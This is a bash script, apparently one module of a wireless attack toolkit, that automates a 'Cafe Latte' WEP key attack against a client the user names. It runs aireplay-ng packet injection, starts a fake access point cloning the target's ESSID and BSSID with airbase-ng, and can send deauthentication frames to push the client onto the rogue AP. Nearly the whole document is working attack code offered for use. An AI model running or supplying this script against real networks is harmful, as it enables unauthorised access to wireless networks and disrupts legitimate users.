#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root # NU AI NEVOIE STERGE DACA VREI SA MEARGA

# Main menu prompt
prompt_to_continue() {
    local options=("Start Cafe Latte attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}              Cafe Latte attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} High packet injection may disrupt legitimate users."
    echo -e "${RED}[!]${NC} Some APs mitigate this. Success is not guaranteed."

    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  # proceed
            0) go_back ;;  # back
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

cafe_attack() {
    clear 

    echo -e "${GREEN}[*]${NC} Enter details for the Cafe Latte attack:"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Target BSSID (MAC format): ")" bssid
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid MAC address."
            sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Client MAC :") " client
        [[ "$client" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
        echo -e "${RED}[!]${NC} Invalid MAC."; sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} Client set: $client"


    read -p "$(echo -e "${GREEN}[*]${NC} Press Enter to start the Cafe Latte attack...")"

    gnome-terminal -- bash -c "sudo aireplay-ng -6 -D -b \"$bssid\" -h \"$client\" \"$MONITOR_INTERFACE\"; exec bash" &

    sleep 0.5

    echo -e "${GREEN}[*]${NC} Enter details for the fake access point:"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Target ESSID (Must be identical to target!): ")" essid
        if [[ -n "$essid" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid ESSID."
            sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} ESSID set: $essid"

    echo -e "${GREEN}[*]${NC} Using same BSSID as previous command..."

    sleep 0.3

    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    sleep 0.3

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Enter channel (Must be identical to target!):") " channel
        if [[ "$channel" =~ ^[0-9]+$ ]] && (( channel>=1 && channel<=14 )); then
            echo -e "${GREEN}[✓]${NC} Channel set: $channel"; sleep 0.3; break
        else
            echo -e "${RED}[!]${NC} Invalid. 1-14 only."; sleep 0.3
        fi
    done

    read -p "$(echo -e "${GREEN}[*]${NC} Press Enter to launch the fake access point...")"

    gnome-terminal -- bash -c "sudo airbase-ng -c \"$channel\" -a \"$bssid\" -e \"$essid\" \"$MONITOR_INTERFACE\" -W 1 -L; exec bash" &

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Do you want to deauthenticate the station to force the client to reconnect to our fake access point? (yes/no):") " deauth_option
        if [[ "$deauth_option" == "yes" ]]; then
            echo -e "${GREEN}[*]${NC} Launching deauthentication attack on station..."
            sleep 1.3
            gnome-terminal -- bash -c "sudo aireplay-ng --deauth 10 -a \"$bssid\" -c \"$client\" \"$MONITOR_INTERFACE\"; exit" &
            break
        elif [[ "$deauth_option" == "no" ]]; then
            echo -e "${GREEN}[*]${NC} Deauthentication attack skipped."
            sleep 1.3
            break
        else
            echo -e "${RED}[!]${NC} Invalid option. Please enter (yes/no)."
        fi
    done

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Type 'stop' to stop the process: ")" user_input
        if [[ "$user_input" == "stop" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid input. Please type 'stop' to stop the command."
        fi
    done
    
    sudo pkill -f aireplay-ng

    sudo pkill -f airbase-ng

    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
    
    sleep 1.3
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New Cafe latte attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; cafe_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice 
    cafe_attack
    after_attack_options
}

main
